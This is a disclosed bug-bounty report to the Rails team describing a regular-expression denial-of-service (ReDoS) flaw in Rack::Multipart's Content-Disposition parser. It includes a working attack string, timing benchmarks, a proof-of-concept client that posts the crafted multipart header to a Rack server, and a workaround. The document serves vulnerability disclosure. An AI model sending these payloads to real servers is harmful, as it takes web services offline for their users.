# ReDoS in Rack::Multipart

## Report Details
- **Report ID**: 1489141
- **URL**: https://hackerone.com/reports/1489141
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-02-22T22:34:07.663Z
- **Disclosed**: 2023-07-28T00:26:27.997Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
Hello, I found ReDoS on Rack.

I found this problem using `recheck` (https://makenowjust-labs.github.io/recheck/), a ReDoS detection tool.

This tool has found multiple places where there seems to be a problem with the rack code, but since there are many and it takes time to check the behavior, I will first report on `Rack::Multipart::RFC2183`, which is the most dangerous.
This is detected as exponential by recheck.

- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart.rb#L38
- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L296

```ruby
❯ bundle exec irb
irb(main):001:0> require 'rack'
=> true
irb(main):002:0> Rack::Multipart::RFC2183
=> /^(?i-mx:Content-Disposition:\s*(?-mix:[^\s()<>,;:\\"\/\[\]?=]+)\s*)((?-mix:;\s*(?:(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)(?-mix:\*[0-9]+)?))=((?-mix:"(?:\\"|[^"])*"|(?-mix:[^\s()<>,;:\\"\/\[\]?=]+))))|(?-mix:(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)(?:\*0)?\*))=((?-mix:[a-zA-Z0-9\-]*'[a-zA-Z0-9\-]*'(?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%]))*)))|(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)\*[1-9][0-9]*\*))=((?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%]))*))))\s*))+$/i
```


### benchmark

rfc2183_benchmark.rb

```ruby
require 'benchmark'
require 'rack'

regexp = Rack::Multipart::RFC2183

def attack_text(length)
 "Content-Disposition:G;\f=\""  + "=;1=\";\fD=\";t*1*" * length + '='
end

Benchmark.bm do |x|
  x.report { attack_text(5)[regexp] }
  x.report { attack_text(10)[regexp] }
  x.report { attack_text(15)[regexp] }
  x.report { attack_text(20)[regexp] }
  x.report { attack_text(25)[regexp] }
  x.report { attack_text(26)[regexp] }
end
```

```
❯ bundle exec ruby rfc2183_benchmark.rb
       user     system      total        real
   0.000018   0.000004   0.000022 (  0.000016)
   0.000357   0.000000   0.000357 (  0.000361)
   0.010888   0.000018   0.010906 (  0.010961)
   0.342814   0.000717   0.343531 (  0.344750)
  10.925193   0.022059  10.947252 ( 10.979092)
  21.906178   0.049380  21.955558 ( 22.024203)
```


### PoC

Gemfile

```ruby
# frozen_string_literal: true

source "https://rubygems.org"

gem 'rack', '~> 2.2', '>= 2.2.3'
gem 'puma', '~> 5.6', '>= 5.6.2'
```

config.ru

```ruby
class Server
  def call(env)
    Rack::Request.new(env).params

    [ 200, {}, []]
  end
end

run Server.new
```

```ruby
require "net/http"
require "uri"

class Net::HTTPGenericRequest

  def encode_multipart_form_data(out, params, opt)
    charset = opt[:charset]
    boundary = opt[:boundary]
    buf = ''
    params.each do |key, value|
      buf << "--#{boundary}\r\n"
      buf << "Content-Disposition:G;\f=\""  + "=;1=\";\fD=\";t*1*" * 27 + '='
      buf << "Content-Type: application/octet-stream\r\n\r\n"

      buf << "content"
      buf << "\r\n"
    end
    buf << "--#{boundary}--\r\n"
    flush_buffer(out, buf, false)
  end
end  

data = [["dummy"]]

url = URI.parse('http://127.0.0.1:9292/')
req = Net::HTTP::Post.new(url.path)
req.set_form(data, "multipart/form-data")

res = Net::HTTP.new(url.host, url.port).start do |http|
  http.request(req)
end
```

`bundle exec rackup` & `bundle exec ruby rfc2183_request.rb`

## Impact

When the client sends a specially crafted header, it occur ReDoS on the server side.
I confirmed that the combination of puma, unicorn, puma + nginx, unicorn + nginx occur Redos.

There are several other places where `Rack::Multipart` is likely to be ReDoS, and it seems good to exclude it as a workaround if user do not use file upload.

#### work around

```ruby
class Rack::Request
  def parse_multipart
    nil
  end
end
```

## Attachments
No attachments
